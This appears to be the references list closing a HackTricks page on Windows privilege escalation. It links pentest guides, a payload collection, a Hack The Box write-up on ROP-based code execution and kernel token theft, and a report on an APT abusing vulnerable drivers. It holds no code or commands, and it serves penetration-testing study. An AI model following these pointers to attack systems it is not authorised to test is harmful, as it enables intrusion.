- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
